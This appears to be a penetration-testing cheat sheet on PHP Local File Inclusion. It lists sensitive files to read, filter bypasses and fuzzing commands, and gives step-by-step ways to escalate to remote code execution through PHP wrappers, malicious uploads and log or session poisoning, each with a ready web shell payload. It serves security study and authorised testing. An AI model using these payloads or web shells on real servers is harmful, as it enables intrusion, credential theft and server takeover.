# Local File Inclusion (LFI)

## **Introduction**

> Local file inclusion (LFI) is the process of including files that are already locally stored on the server through the exploitation of vulnerable inclusion procedures implemented in the application.\
> This vulnerability occurs, for example, when a page receives as input the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as `../`) to be injected\
> \
> LFI (Local File Inclusion) vulnerabilities allow an attacker to include a local file (on the server) due to the use of user-supplied input without proper validation. This can lead to:
>
> * Showing the contents of the file
> * Code execution on the web server
> * Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS)
> * Denial of Service (DoS)
> * Sensitive Information Disclosure

***

## **LFI Interesting Files**

#### **Linux Files**

```
Interesting:
 /etc/passwd
 /etc/shadow
 /etc/hosts
 /etc/issue
 /etc/group
 /etc/hostname
 /home/user/
 /home/user/.ssh
 /home/user/bash_history

Log Files:
 /var/log/apache/access.log
 /var/log/apache2/access.log
 /var/log/httpd/access_log
 /var/log/apache/error.log
 /var/log/apache2/error.log
 /var/log/httpd/error_log
```

***

#### **Web Server Files**

> The htpasswd file contains credentials for HTTP basic authentication The password inside this file can be encrypted with md5crypt To crack them: hashcat with mode (-m) 500

```
/path/to/webroot/.htpasswd
/path/to/webroot/.htaccess
```

***

#### **NGINX Files**

```
/etc/nginx/sites-enabled/default (Note: this is useful to find the current web application's web root)
/var/log/nginx/access_log
/var/log/nginx/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/nginx.access_log
/var/log/nginx.error_log
/etc/nginx/nginx.conf
/usr/local/etc/nginx/nginx.conf
/usr/local/nginx/conf/nginx.conf
```

***

#### **CMS Configuration Files**

```
WordPress: /var/www/html/wp-config.php
Joomla: /var/www/configuration.php
Dolphin CMS: /var/www/html/inc/header.inc.php
Drupal: /var/www/html/sites/default/settings.php
Mambo: /var/www/configuration.php
PHPNuke: /var/www/config.php
PHPbb: /var/www/config.php
```

***

#### **Windows Files**

```
c:\WINDOWS\system32\eula.txt
c:\boot.ini  
c:\WINDOWS\win.ini  
c:\WINNT\win.ini  
c:\WINDOWS\Repair\SAM  
c:\WINDOWS\php.ini  
c:\WINNT\php.ini  
c:\Program Files\Apache Group\Apache\conf\httpd.conf  
c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
c:\Program Files\xampp\apache\conf\httpd.conf  
c:\php\php.ini  
c:\php5\php.ini  
c:\php4\php.ini  
c:\apache\php\php.ini  
c:\xampp\apache\bin\php.ini  
c:\home2\bin\stable\apache\php.ini  
c:\home\bin\stable\apache\php.ini
```

***

#### **LFI Interesting Files Lists**

1. [https://github.com/hussein98d/LFI-files/blob/master/list.txt](https://github.com/hussein98d/LFI-files/blob/master/list.txt)
2. [https://github.com/ricew4ng/Blasting-Dictionary/blob/master/LFI-Interesting-Files%EF%BC%88249%EF%BC%89.txt](https://github.com/ricew4ng/Blasting-Dictionary/blob/master/LFI-Interesting-Files%EF%BC%88249%EF%BC%89.txt)

***

## **Basic LFI Examples**

| Command                                                | Description             |
| ------------------------------------------------------ | ----------------------- |
| /index.php?language=/etc/passwd                        | Basic LFI               |
| /index.php?language=../../../../etc/passwd             | LFI with path traversal |
| /index.php?language=/../../../etc/passwd               | LFI with name prefix    |
| /index.php?language=./languages/../../../../etc/passwd | LFI with approved path  |

***

## **LFI Fuzzing**

| Command                                                                                                                                                                        | Description                |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------- |
| ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://\<SERVER\_IP>:/index.php?FUZZ=value' -fs 2287                                      | Fuzz page parameters       |
| ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://\<SERVER\_IP>:/index.php?language=FUZZ' -fs 2287                                                      | Fuzz LFI payloads          |
| ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://\<SERVER\_IP>:/index.php?language=../../../../FUZZ/index.php' -fs 2287 | Fuzz webroot path          |
| ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://\<SERVER\_IP>:/index.php?language=../../../../FUZZ' -fs 2287                                                                      | Fuzz server configurations |

***

## **LFI Automated Tools**

1. [https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)
2. [https://github.com/OsandaMalith/LFiFreak](https://github.com/OsandaMalith/LFiFreak)
3. [https://github.com/mzfr/liffy](https://github.com/mzfr/liffy)

***

## **LFI Filter Bypasses**

1. Bypass basic path traversal filter: `/index.php?language=....//....//....//....//etc/passwd`
2. Bypass using URL encoding of ../../../etc/passwd: `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
3. Read PHP with base64 filter: `/index.php?language=php://filter/convert.base64-encode/resource=config`
4. Bypass appended extension with path truncation (obsolete): `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]`
5. Bypass appended extension with null byte (obsolete): `/index.php?language=../../../../etc/passwd%00`

***

## **LFI to RCE abusing PHP Data Wrapper**

> * The PHP Data Wrapper can be used to **include external data, including PHP code**
> * The Data Wrapper is **only available to use if the (`allow_url_include`) setting is enabled** in the PHP configurations.
> * This option is **not enabled by default**
> * This option is required for any RFI attack and several LFI attacks

**The steps to abuse the PHP Data Wrapper to gain RCE are the following:**

1. Check if `allow_url_include` is enabled:
   * To do so, you need to read the PHP configuration file found at
   * (`/etc/php/X.Y/apache2/php.ini`) for Apache
   * (`/etc/php/X.Y/fpm/php.ini`) for Nginx,
   * where `X.Y` is your install PHP version
2. Read the PHP Configuration File using the base64 filter (to ensure everything is read properly)
   * `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`
3. Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` to see its value
   * `echo <BASE64VALUE> | base64 -d | grep allow_url_include`
4. If `allow_url_include` is `ON`, then it is possible to `gain RCE` using the following:
   * Generate the base64 version of the PHP RCE Payload\
     `echo '<?php system($_GET["cmd"]); ?>' | base64`
   * URL encode the base64 string
   * Pass it to the data wrapper with `data://text/plain;base64,`
   * Append `&cmd=<COMMAND>`
   * For example: `http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=id`

***

## **LFI to RCE abusing PHP Input Wrapper**

> * The PHP Data Wrapper can be used to **include external data, including PHP code**
> * The Data Wrapper is **only available to use if the (`allow_url_include`) setting is enabled** in the PHP configurations.
> * This option is **not enabled by default**
> * This option is required for any RFI attack and several LFI attacks
> * It's basically **the same as the PHP Data Wrapper**, but this requires a **POST request**

**The steps required to gain RCE are the same as the PHP Data Wrapper, you only need to change the GET request to POST using the following**

* `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"`

***

## **LFI to RCE abusing PHP Expect Wrapper**

> * The expect wrapper allows us to directly run commands through URL streams.
> * It basically acts similarly to a web shell

**To exploit the Expect Wrapper:**

1. Read the PHP Configuration file using base64 encoding:
   * `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`
2. Check if `expect` is used (e.g. `extension=expect`)
   * `echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect`
3. Run commands using expect:
   * `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`

***

## **LFI - File (Image) Upload to RCE**

> * For this kind of attack, it's not necessary to have a file upload vulnerability
> * The only requirement is to have a IMAGE file upload functionality on the target
> * If such functionality runs code, it's possible to inject an image containing a payload to gain RCE
> * Then, after injecting the payload, we can run it through the LFI vulnerability

**The steps are the following:**

1. Create an image (using the GIF8 magic bytes or any alternative) containing the following RCE payload: `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
2. Identify the upload path, for example: `/index.php?language=./profile_images/`
3. Leverage the RCE through file inclusion: `http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`

***

## **LFI - ZIP Upload to RCE**

> * There are a couple of PHP-only techniques that utilize PHP wrappers to achieve the same goal as the previous Image upload to RCE.
> * These techniques are the ZIP Upload and Phar Upload to gain RCE
> * These techniques may become handy in some specific cases where the simple Image Upload technique does not work.
> * We can utilize the zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work.

**The steps are the following:**

1. Create a PHP web shell script and zip it
   * `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`
2. After uploading the shell.jpg archive, include it with the zip wrapper as (zip://shell.jpg), and then refer to any files within it with #shell.php (URL encoded).
3. Finally, we can execute commands as we always do with \&cmd=id, as follows:
   * `http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`

***

## **Phar Upload**

> * There are a couple of PHP-only techniques that utilize PHP wrappers to achieve the same goal as the previous Image upload to RCE.
> * These techniques are the ZIP Upload and Phar Upload to gain RCE
> * These techniques may become handy in some specific cases where the simple Image Upload technique does not work.

**The steps are the following:**

1.  Write the following `shell.php` file

    ```
    <?php
    $phar = new Phar('shell.phar');
    $phar->startBuffering();
    $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');

    $phar->stopBuffering();
    ```
2. Compile the `phar` file and rename it as `shell.jpg`:
   * `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
3. Use the `phar wrapper` to run commands (note: you may need to use the URL encoding of `/shell.txt`):
   * `http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`

***

## **PHP Session - Log Poisoning LFI to RCE**

> * This attack requires writing PHP code in a field we control that gets logged into a log file
> * The same file is then included in order to execute the PHP code.
> * For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.
> * PHP Session Poisoning works by poisoning a parameter stored inside the PHPSESSID cookie (which can hold specific user-related data on the back-end)
> * The details of PHPSESSID cookies are stored in session files on the back-end, saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows.
> * The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess\_ prefix.
> * For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess\_el4ukv0kqbvoirg7nkp4dncpk3.

**The steps are the following:**

1. Get our PHPSESSID cookie value
2. Use LFI to examine our PHPSESSID session file (`/var/lib/php/sessions/` Linux or `C:\Windows\Temp\` Windows)
3. Check if any data inside the session file is under our control in order to poison it
4. For example, the session file may contain a `language` value which is controlled through the get parameter `?language=`
5. Set the value of such parameter (by simply visiting the page with ?language=session\_poisoning) and check if it changes in the session file
6. Poison the parameter by writing PHP code to the session file. We can write a basic PHP web shell by changing the ?language= parameter to a URL encoded web shell, as follows:
7. `http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
8. Finally, we can include the session file and use the \&cmd=id to execute a commands: `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`

***

## **Server Logs Poisoning - Log Poisoning LFI to RCE**

> * This attack requires writing PHP code in a field we control that gets logged into a log file
> * The same file is then included in order to execute the PHP code.
> * For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.
> * Both **Apache** and **Nginx** make use of **logfiles containing information about the requests against the server**
> * Inside those logs, it's possible to read the different `User-Agent` values for each request
> * **By modifying the value of the user agent, it's possible to inject PHP code to gain RCE**
> * By default, both nginx and apache logfiles are not readable by low-privileged users
> * The default path of the logfiles are as follows:
>   1. Apache logs: `/var/log/apache2` in Linux, `C:\xampp\apache\logs\`in Windows
>   2. Nginx logs: `/var/log/nginx/` in Linux, `C:\nginx\log\` in Windows

**The steps are the following:**

1. Use any LFI payload to check if the webserver logfiles are readable
2. Use BurpSuite, intercept the same request via LFI to the logfile and change the user agent value
3. Check if that same value is correctly stored inside the logfile
4. If that is the case, inject one of the following payloads as the User-Agent value:
   * `'<?php system($_GET["cmd"]); ?>'`
   * `<?php **system**($_GET["cmd"]); ?>`
5. Get RCE by using the same LFI path followed by `&cmd=id`, for example: `http://server:port/index.php?language=/var/log/apache2/access.log&cmd=id`
